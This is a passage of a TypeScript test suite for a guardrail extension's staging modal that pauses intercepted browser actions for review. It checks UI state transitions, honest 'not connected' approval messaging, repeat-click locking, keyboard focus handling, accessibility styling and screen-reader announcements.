  showStagingModal({
    context: createSampleContext({
      actionId: actionId12F,
      interceptionState: InterceptionState.HELD,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
  });

  const shadow12F = getStagingModalShadowRoot();
  const reqBtn12F = shadow12F?.querySelector('#gs-btn-request-approval') as any;
  reqBtn12F.click();

  const infoBanner = shadow12F?.querySelector('.gs-confirmation-info');
  assert(Boolean(infoBanner), 'Info confirmation banner rendered with .gs-confirmation-info');

  const bannerTitle = shadow12F?.querySelector('.gs-confirmation-title')?.textContent || '';
  const bannerDesc = shadow12F?.querySelector('.gs-confirmation-desc')?.textContent || '';
  const footerNotice = shadow12F?.querySelector('.gs-footer-notice')?.textContent || '';
  const modePillText = shadow12F?.querySelector('.gs-mode-pill')?.textContent || '';

  assertEquals(bannerTitle, 'Approval Request Prepared (Local Prototype)', 'Banner title is "Approval Request Prepared (Local Prototype)"');
  assert(bannerDesc.includes('Remote caretaker approval and backend services are not connected yet'), 'Banner description clarifies backend and caretaker are not connected');
  assert(bannerDesc.includes('This action remains safely paused and will not execute'), 'Banner description confirms action remains safely paused');

  // STRICT REQUIREMENT 8: Must NOT show "Request sent", "Caretaker notified", or "Approved"
  const allModalText = shadow12F?.textContent || '';
  assert(!allModalText.includes('Request sent'), 'Modal does NOT claim "Request sent"');
  assert(!allModalText.includes('Caretaker notified'), 'Modal does NOT claim "Caretaker notified"');
  assert(!allModalText.includes('Approved'), 'Modal does NOT claim "Approved"');

  // Footer notice explicitly notes backend not connected
  assert(footerNotice.includes('Backend not connected'), 'Footer notice contains "Backend not connected"');
  assert(footerNotice.includes('State: HELD'), 'Footer notice shows "State: HELD"');
  assertEquals(modePillText, 'Paused (Request Prepared)', 'Mode pill indicates "Paused (Request Prepared)"');

  dismissStagingModal();
}

// ============================================================
// TEST 13: Staging Mode Reliability, Clarity & Accessibility
// ============================================================
console.log('\n▶ Test 13: Staging Mode Reliability, Clarity & Accessibility');

{
  const testController = new InterceptionController();
  const testManager = new ContinuationManager(testController);

  // ------------------------------------------------------------
  // Subtest 13A: Visually & Programmatically Distinct Interface States
  // ------------------------------------------------------------
  console.log('  → Subtest 13A: Visually & Programmatically Distinct Interface States');
  const actionId13A = 'action-distinct-states-13a';
  const testAction13A: GuardrailAction = {
    id: actionId13A,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction13A, 'Registered');
  testController.holdAction(actionId13A, 'Held for review');

  showStagingModal({
    context: createSampleContext({
      actionId: actionId13A,
      riskLevel: RiskLevel.MEDIUM,
      riskScore: 45,
      interceptionState: InterceptionState.HELD,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
  });

  const shadow13A = getStagingModalShadowRoot()!;
  assert(Boolean(shadow13A), 'Shadow root exists for distinct states testing');

  // State 1: HELD
  assertEquals(getStagingUIState(), 'held', 'Initial interface state is "held"');
  const pillHeld = shadow13A.querySelector('.gs-mode-pill');
  assertEquals(pillHeld?.textContent, 'Review Mode', 'Mode pill text is "Review Mode" for held state');
  assert(pillHeld?.classList.contains('gs-badge-held') || false, 'Mode pill has .gs-badge-held');
  const titleHeld = shadow13A.querySelector('.gs-heading-title');
  assertEquals(titleHeld?.textContent, 'Action Paused for Your Review', 'Title indicates action paused for review');
  const cancelBtn13A = shadow13A.querySelector('#gs-btn-cancel-action') as any;
  const reqBtn13A = shadow13A.querySelector('#gs-btn-request-approval') as any;
  assertEquals(cancelBtn13A.disabled, false, 'Cancel button is enabled in held state');
  assertEquals(reqBtn13A.disabled, false, 'Request approval button is enabled in held state');
  const liveAnnouncer = shadow13A.querySelector('#gs-live-announcer');
  assert(Boolean(liveAnnouncer), 'Live announcer element (#gs-live-announcer) exists in shadow root');
  assert(liveAnnouncer?.textContent?.includes('Action paused for review') || false, 'Live announcer announced held state');

  // State 2: CANCELLING (in-progress)
  setStagingUIState('cancelling');
  assertEquals(getStagingUIState(), 'cancelling', 'UI state transitioned to "cancelling"');
  const pillCancelling = shadow13A.querySelector('.gs-mode-pill');
  assertEquals(pillCancelling?.textContent, 'Cancelling...', 'Mode pill text is "Cancelling..."');
  assert(pillCancelling?.classList.contains('gs-badge-cancelling') || false, 'Mode pill has .gs-badge-cancelling');
  assertEquals(cancelBtn13A.textContent, 'Cancelling...', 'Cancel button text is "Cancelling..."');
  assertEquals(cancelBtn13A.disabled, true, 'Cancel button is disabled during cancellation');
  assertEquals(cancelBtn13A.getAttribute('aria-busy'), 'true', 'Cancel button has aria-busy="true"');
  assertEquals(reqBtn13A.disabled, true, 'Request button is disabled during cancellation');
  assert(liveAnnouncer?.textContent?.includes('Cancelling action') || false, 'Live announcer announced cancelling in progress');

  // State 3: CANCELLED (successful)
  setStagingUIState('cancelled');
  assertEquals(getStagingUIState(), 'cancelled', 'UI state transitioned to "cancelled"');
  const pillCancelled = shadow13A.querySelector('.gs-mode-pill');
  assertEquals(pillCancelled?.textContent, 'Cancelled', 'Mode pill text is "Cancelled"');
  assert(pillCancelled?.classList.contains('gs-badge-cancelled') || false, 'Mode pill has .gs-badge-cancelled');
  const titleCancelled = shadow13A.querySelector('.gs-heading-title');
  assertEquals(titleCancelled?.textContent, 'Action Cancelled', 'Title updated to "Action Cancelled"');
  const bannerSuccess = shadow13A.querySelector('.gs-confirmation-success');
  assert(Boolean(bannerSuccess), 'Confirmation success banner is rendered');
  assertEquals(cancelBtn13A.textContent, 'Action Cancelled', 'Cancel button displays "Action Cancelled"');
  assertEquals(cancelBtn13A.disabled, true, 'Cancel button remains disabled in cancelled state');
  assertEquals(reqBtn13A.style.display, 'none', 'Request button is hidden in cancelled state');
  assert(liveAnnouncer?.textContent?.includes('Action cancelled. Nothing was changed.') || false, 'Live announcer announced cancellation success');

  // State 4: INTENT_RECORDED (approval request intent recorded locally)
  setStagingUIState('approval_intent_recorded');
  assertEquals(getStagingUIState(), 'approval_intent_recorded', 'UI state transitioned to "approval_intent_recorded"');
  const pillRequested = shadow13A.querySelector('.gs-mode-pill');
  assertEquals(pillRequested?.textContent, 'Paused (Request Prepared)', 'Mode pill indicates "Paused (Request Prepared)"');
  assert(pillRequested?.classList.contains('gs-badge-requested') || false, 'Mode pill has .gs-badge-requested');
  const bannerInfo = shadow13A.querySelector('.gs-confirmation-info');
  assert(Boolean(bannerInfo), 'Confirmation info banner is rendered');
  assertEquals(reqBtn13A.textContent, 'Request Prepared (Local)', 'Request button shows "Request Prepared (Local)"');
  assertEquals(reqBtn13A.disabled, true, 'Request button is disabled');
  assertEquals(cancelBtn13A.disabled, false, 'Cancel button is re-enabled so user can still cancel held action');
  assert(liveAnnouncer?.textContent?.includes('Approval request intent recorded locally') || false, 'Live announcer announced approval intent recorded');

  // State 5: STALE_OR_INVALID (operation failed / stale / no longer valid)
  setStagingUIState('stale_or_invalid', { error: 'Interception record is no longer active.' });
  assertEquals(getStagingUIState(), 'stale_or_invalid', 'UI state transitioned to "stale_or_invalid"')
  const pillStale = shadow13A.querySelector('.gs-mode-pill');
  assertEquals(pillStale?.textContent, 'Operation Unavailable', 'Mode pill indicates "Operation Unavailable"');
  assert(pillStale?.classList.contains('gs-badge-stale') || false, 'Mode pill has .gs-badge-stale');
  const titleStale = shadow13A.querySelector('.gs-heading-title');
  assertEquals(titleStale?.textContent, 'Action No Longer Held', 'Title updated to "Action No Longer Held"');
  const bannerError = shadow13A.querySelector('.gs-confirmation-error');
  assert(Boolean(bannerError), 'Confirmation error banner is rendered');
  assertEquals(cancelBtn13A.disabled, true, 'Cancel button is disabled in stale state');
  assertEquals(reqBtn13A.disabled, true, 'Request button is disabled in stale state');
  assertEquals(liveAnnouncer?.getAttribute('role'), 'alert', 'Live announcer role switched to "alert" for stale/error state');
  assertEquals(liveAnnouncer?.getAttribute('aria-live'), 'assertive', 'Live announcer aria-live switched to "assertive" for stale/error state');

  dismissStagingModal();

  // ------------------------------------------------------------
  // Subtest 13B: Mutual Operation Locking & Repeated Activation
  // ------------------------------------------------------------
  console.log('  → Subtest 13B: Mutual Operation Locking & Repeated Activation');
  const actionId13B = 'action-mutual-lock-13b';
  const testAction13B: GuardrailAction = {
    id: actionId13B,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction13B, 'Registered');
  testController.holdAction(actionId13B, 'Held');

  let handler13BExecutions = 0;
  testManager.registerHeldAction(testAction13B, testController.getRecord(actionId13B)!, () => {
    handler13BExecutions++;
  });

  let cancelCallbacks = 0;
  showStagingModal({
    context: createSampleContext({
      actionId: actionId13B,
      interceptionState: InterceptionState.HELD,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancelSuccess: () => {
      cancelCallbacks++;
    },
  });

  const shadow13B = getStagingModalShadowRoot()!;
  const cancelBtn13B = shadow13B.querySelector('#gs-btn-cancel-action') as any;
  const reqBtn13B = shadow13B.querySelector('#gs-btn-request-approval') as any;

  // Click cancel: should lock both buttons and cancel action safely
  cancelBtn13B.click();
  // Attempt clicking request approval while cancelled / after cancel:
  reqBtn13B.click();
  reqBtn13B.click();
  // Attempt clicking cancel again:
  cancelBtn13B.click();
  cancelBtn13B.click();

  assertEquals(cancelCallbacks, 1, 'Cancellation callback executed exactly once');
  assertEquals(handler13BExecutions, 0, 'Handler execution strictly 0 during repeated clicks');
  assertEquals(testController.getRecord(actionId13B)?.state, InterceptionState.CANCELLED, 'Action transitioned to CANCELLED');

  dismissStagingModal();

  // ------------------------------------------------------------
  // Subtest 13C: Full Keyboard Navigation, Focus Trapping & Restoration
  // ------------------------------------------------------------
  console.log('  → Subtest 13C: Full Keyboard Navigation, Focus Trapping & Restoration');
  // Create an external host page button to test focus restoration
  const externalPageBtn = (globalThis as any).document.createElement('BUTTON');
  externalPageBtn.id = 'external-trigger-button';
  (globalThis as any).document.body.appendChild(externalPageBtn);
  externalPageBtn.focus();

  assertEquals((globalThis as any).document.activeElement, externalPageBtn, 'External page button has active focus before modal');

  const actionId13C = 'action-keyboard-13c';
  const testAction13C: GuardrailAction = {
    id: actionId13C,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction13C, 'Registered');
  testController.holdAction(actionId13C, 'Held');

  showStagingModal({
    context: createSampleContext({
      actionId: actionId13C,
      interceptionState: InterceptionState.HELD,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
  });

  const shadow13C = getStagingModalShadowRoot()!;
  const focusable13C = getFocusableElements(shadow13C);
  assertEquals(focusable13C.length, 4, 'Four interactive controls identified in active modal (Close, Secondary, Cancel, Request)');

  const closeBtn13C = shadow13C.querySelector('.gs-btn-close') as any;
  const secondaryBtn13C = shadow13C.querySelector('.gs-btn-secondary') as any;
  const cancelBtn13C = shadow13C.querySelector('#gs-btn-cancel-action') as any;
  const reqBtn13C = shadow13C.querySelector('#gs-btn-request-approval') as any;

  // Initial focus check: Cancel Action button or first interactive button has focus
  const initialActive = (globalThis as any).document.activeElement;
  assert(initialActive === cancelBtn13C || initialActive === closeBtn13C, 'Initial focus placed on modal interactive control');

  // Test sequential forward Tab cycling through controls
  closeBtn13C.focus();
  assertEquals((globalThis as any).document.activeElement, closeBtn13C, 'Focus set to close button');

  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Tab', shiftKey: false, preventDefault: () => {} });
  assertEquals((globalThis as any).document.activeElement, secondaryBtn13C, 'Tab moved focus to secondary button');

  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Tab', shiftKey: false, preventDefault: () => {} });
  assertEquals((globalThis as any).document.activeElement, cancelBtn13C, 'Tab moved focus to cancel action button');

  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Tab', shiftKey: false, preventDefault: () => {} });
  assertEquals((globalThis as any).document.activeElement, reqBtn13C, 'Tab moved focus to request approval button');

  // Forward Tab on last element wraps back to first element (Close button)
  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Tab', shiftKey: false, preventDefault: () => {} });
  assertEquals((globalThis as any).document.activeElement, closeBtn13C, 'Tab wrapped focus back to first control (close button)');

  // Test backward Shift+Tab cycling
  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Tab', shiftKey: true, preventDefault: () => {} });
  assertEquals((globalThis as any).document.activeElement, reqBtn13C, 'Shift+Tab wrapped focus backwards to last control (request button)');

  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Tab', shiftKey: true, preventDefault: () => {} });
  assertEquals((globalThis as any).document.activeElement, cancelBtn13C, 'Shift+Tab moved focus backwards to cancel button');

  // Test Escape key dismiss
  (globalThis as any).window.dispatchEvent({ type: 'keydown', key: 'Escape' });
  assertEquals(isStagingModalActive(), false, 'Escape key dismisses staging modal');

  // Test Focus Restoration to prior element
  assertEquals((globalThis as any).document.activeElement, externalPageBtn, 'Focus restored to external trigger button upon modal dismissal');
  externalPageBtn.remove();

  // ------------------------------------------------------------
  // Subtest 13D: Visible Focus Indicators, Touch Targets & Mobile Query
  // ------------------------------------------------------------
  console.log('  → Subtest 13D: Visible Focus Indicators, Touch Targets & Mobile Query');
  showStagingModal({
    context: createSampleContext({ actionId: 'action-styles-13d' }),
    state: 'active',
  });

  const shadow13D = getStagingModalShadowRoot()!;
  const styleEl = shadow13D.querySelector('style')!;
  const cssContent = styleEl.textContent || '';

  // Focus visible styles
  assert(cssContent.includes('.gs-btn:focus-visible'), 'CSS defines .gs-btn:focus-visible');
  assert(cssContent.includes('.gs-btn-close:focus-visible'), 'CSS defines .gs-btn-close:focus-visible');
  assert(cssContent.includes('outline: 2px solid #38bdf8'), 'Focus indicator uses high-contrast 2px cyan outline');
  assert(cssContent.includes('outline-offset: 2px'), 'Focus indicator includes 2px offset for visual clarity');

  // Touch targets (min 44x44px for WCAG 2.5.5 / 2.5.8)
  assert(cssContent.includes('min-height: 44px'), 'Buttons have min-height: 44px');
  assert(cssContent.includes('min-width: 44px'), 'Buttons have min-width: 44px');

  // Responsive mobile query & reduced motion
  assert(cssContent.includes('@media (max-width: 640px)'), 'CSS contains responsive breakpoint for viewports <= 640px');
  assert(cssContent.includes('flex-direction: column-reverse'), 'Mobile footer stacks buttons in reverse column order');
  assert(cssContent.includes('@media (prefers-reduced-motion: reduce)'), 'CSS accommodates prefers-reduced-motion: reduce');

  dismissStagingModal();

  // ------------------------------------------------------------
  // Subtest 13E: Non-Color-Alone Risk & Warning Communication
  // ------------------------------------------------------------
  console.log('  → Subtest 13E: Non-Color-Alone Risk & Warning Communication');
  // LOW Risk
  showStagingModal({
    context: createSampleContext({
      actionId: 'action-risk-low',
      riskLevel: RiskLevel.LOW,
      riskScore: 15,
    }),
    state: 'active',
  });
  const shadowLow = getStagingModalShadowRoot()!;
  const lowHeadline = shadowLow.querySelector('#gs-risk-heading')?.textContent || '';
  const lowBadge = shadowLow.querySelector('.gs-risk-badge');
  assert(lowHeadline.includes('Routine Activity'), 'LOW risk headline includes plain text "Routine Activity"');
  assert(lowBadge?.getAttribute('aria-label')?.includes('LOW risk') || false, 'LOW risk badge has accessible aria-label');

  // HIGH Risk
  updateStagingModal({
    context: createSampleContext({
      actionId: 'action-risk-high',
      riskLevel: RiskLevel.HIGH,
      riskScore: 75,
    }),
    state: 'active',
  });
  const shadowHigh = getStagingModalShadowRoot()!;
  const highHeadline = shadowHigh.querySelector('#gs-risk-heading')?.textContent || '';
  const highBadge = shadowHigh.querySelector('.gs-risk-badge');
  assert(highHeadline.includes('Sensitive Operation'), 'HIGH risk headline includes plain text "Sensitive Operation"');
  assert(highBadge?.getAttribute('aria-label')?.includes('HIGH risk') || false, 'HIGH risk badge has accessible aria-label');

  // CRITICAL Risk
  updateStagingModal({
    context: createSampleContext({
      actionId: 'action-risk-crit',
      riskLevel: RiskLevel.CRITICAL,
      riskScore: 95,
    }),
    state: 'active',
  });
  const shadowCrit = getStagingModalShadowRoot()!;
  const critHeadline = shadowCrit.querySelector('#gs-risk-heading')?.textContent || '';
  const critBadge = shadowCrit.querySelector('.gs-risk-badge');
  assert(critHeadline.includes('High-Impact Action'), 'CRITICAL risk headline includes plain text "High-Impact Action"');
  assert(critBadge?.getAttribute('aria-label')?.includes('CRITICAL risk') || false, 'CRITICAL risk badge has accessible aria-label');

  // Check screen-reader text summary exists inside risk header
  const srSummary = shadowCrit.querySelector('.gs-risk-header .gs-sr-only');
  assert(Boolean(srSummary), 'Screen reader explicit text summary exists inside risk header');
  assert(srSummary?.textContent?.includes('Severity Level: CRITICAL') || false, 'Screen reader summary announces "Severity Level: CRITICAL"');

  dismissStagingModal();

  // ------------------------------------------------------------
  // Subtest 13F: Screen Reader Live Region Announcements
  // ------------------------------------------------------------
  console.log('  → Subtest 13F: Screen Reader Live Region Announcements');
  showStagingModal({
    context: createSampleContext({ actionId: 'action-sr-13f' }),
    state: 'active',
  });
  const shadow13F = getStagingModalShadowRoot()!;
  const announcer13F = shadow13F.querySelector('#gs-live-announcer');
  assert(Boolean(announcer13F), 'Live announcer element #gs-live-announcer exists');
  assertEquals(announcer13F?.getAttribute('role'), 'status', 'Default announcer role is "status"');
  assertEquals(announcer13F?.getAttribute('aria-live'), 'polite', 'Default announcer aria-live is "polite"');

  announceStagingState('Custom polite announcement test.');
  assertEquals(announcer13F?.textContent, 'Custom polite announcement test.', 'Polite message written to live announcer');

  announceStagingState('High priority alert message test.', true);
  assertEquals(announcer13F?.getAttribute('role'), 'alert', 'Alert message switches role to "alert"');
  assertEquals(announcer13F?.getAttribute('aria-live'), 'assertive', 'Alert message switches aria-live to "assertive"');
  assertEquals(announcer13F?.textContent, 'High priority alert message test.', 'Alert message written to live announcer');

  dismissStagingModal();

  // ------------------------------------------------------------
  // Subtest 13G: Stale Interception Record Handling Without Re-Execution
  // ------------------------------------------------------------
  console.log('  → Subtest 13G: Stale Interception Record Handling Without Re-Execution');
  const actionId13G = 'action-stale-13g';
  const testAction13G: GuardrailAction = {
    id: actionId13G,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction13G, 'Registered');
  testController.holdAction(actionId13G, 'Held');

  let handler13GExecutions = 0;
  testManager.registerHeldAction(testAction13G, testController.getRecord(actionId13G)!, () => {
    handler13GExecutions++;
  });

  testController.continueAction(actionId13G, 'Already continued');

  let cancelErrorTriggered = false;
  showStagingModal({
    context: createSampleContext({
      actionId: actionId13G,
      interceptionState: InterceptionState.CONTINUED,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancelError: () => {
      cancelErrorTriggered = true;
    },
  });

  const shadow13G = getStagingModalShadowRoot()!;
  const cancelBtn13G = shadow13G.querySelector('#gs-btn-cancel-action') as any;

  // Trigger Cancel on already-continued action
  cancelBtn13G.click();

  assertEquals(cancelErrorTriggered, true, 'Cancellation rejected for already-CONTINUED action');
  assertEquals(handler13GExecutions, 0, 'Handler was NEVER executed when cancellation rejected');
  assertEquals(getStagingUIState(), 'stale_or_invalid', 'UI state transitioned to "stale_or_invalid"');

  const pillStale13G = shadow13G.querySelector('.gs-mode-pill');
  assertEquals(pillStale13G?.textContent, 'Operation Unavailable', 'Mode pill updated to "Operation Unavailable"');
  assert(pillStale13G?.classList.contains('gs-badge-stale') || false, 'Mode pill has .gs-badge-stale');
  assertEquals(cancelBtn13G.disabled, true, 'Cancel button permanently disabled after rejection');

  // Direct test of handleModalCancel with undefined actionId
  const dummyBtn = (globalThis as any).document.createElement('BUTTON');
  const directCancelResult = handleModalCancel(undefined, {}, {
    cancelBtn: dummyBtn,
    body: (globalThis as any).document.createElement('DIV'),
    header: (globalThis as any).document.createElement('HEADER'),
  });
  assertEquals(directCancelResult.success, false, 'handleModalCancel directly rejects undefined actionId');

  dismissStagingModal();
}

console.log('\n============================================================');
console.log(`TOTAL STAGING UI TESTS: ${passed + failed} | PASSED: ${passed} | FAILED: ${failed}`);
console.log('============================================================\n');

if (failed > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
